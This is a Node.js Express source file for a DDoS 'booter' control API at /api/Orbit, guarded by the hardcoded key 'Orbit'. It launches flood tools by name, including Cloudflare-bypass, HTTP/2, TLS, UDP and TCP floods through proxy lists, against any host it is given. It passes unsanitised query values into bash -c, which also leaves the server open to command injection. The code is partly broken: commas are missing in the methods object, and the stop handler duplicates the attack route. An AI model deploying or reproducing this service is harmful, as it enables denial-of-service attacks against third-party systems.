const express = require('express');
const { spawn } = require('child_process');
const app = express();
const port = 3030;

const methods = {
    BYPASSCF: 'bypass-cf.js',
    TCPKILL: 'tcp-kill',
    FLOOD: 'flood.js',
    H2BIT: 'h2-bit.js',
    TLS: 'tls',
    BYPASSR2: 'bypassr2.js'
    BROWSER: 'browser.py'
    UDPPPS: 'udp-pps.go'
};

// Daftar proses yang berjalan
const activeProcesses = new Map();

const generateCommand = (method, host, port, time) => {
    switch (method) {
        case 'FLOOD':
            return `node flood.js ${host} ${time} 8 4 proxy.txt`;
        case 'H2BIT':
            return `node h2-bit.js ${host} ${time} 20 10 proxy.txt`;
        case 'TLS':
            return `./tls ${host} ${time} 70 10`;
        case 'BROWSER':
            return `python3 browser.py  ${host} ${time}`;
        case 'BYPASSR2':
            return `node bypassr2.js ${host} ${time} 10 2 proxy.txt --cache true --cookie true --bfm true`;  
        case 'BYPASSCF':
            return `node bypass-cf.js ${host} ${time} 10 2 proxy.txt --bfm true --cache true --autoratelimit true`;
        case 'UDPPPS':
            return `./udp-pps ${host} ${port} ${time} 90`;
        case 'TCPKILL':
            return `./tcp-kill ${host} ${port} 50 ${time}`;
        default:
            return `node ${methods[method]} ${host} ${time}`;
    }
};

app.get('/api/Orbit', (req, res) => {
    const key = req.query.key;
    const host = req.query.host;
    const port = req.query.port;
    const time = req.query.time;
    const method = req.query.method;

    if (key !== 'Orbit') {
        return res.status(401).json({ error: 'Invalid key' });
    }

    if (!methods[method]) {
        return res.status(400).json({ error: 'Unknown method' });
    }

    res.json({
        status: 'Attack initiated',
        host: host,
        port: port,
        time: time,
        method: method,
    });

    const command = generateCommand(method, host, port, time);
    const process = spawn('bash', ['-c', command], { detached: true });

    process.stdout.on('data', (data) => {
        console.log(`Stdout: ${data}`);
    });

    process.stderr.on('data', (data) => {
        console.error(`Stderr: ${data}`);
    });

    process.on('close', (code) => {
        console.log(`Process exited with code ${code}`);
    });

    // Simpan proses yang sedang berjalan
    activeProcesses.set(process.pid, process);
});

app.get('/api/Orbit', (req, res) => {
    const key = req.query.key;

    if (key !== 'Orbit') {
        return res.status(401).json({ error: 'Invalid key' });
    }

    activeProcesses.forEach((process, pid) => {
        process.kill();
        activeProcesses.delete(pid);
    });

    res.json({ status: 'All attacks stopped.' });
});

app.listen(port, () => {
    console.log(`Server running at http://129.212.227.125:${port}`);
});
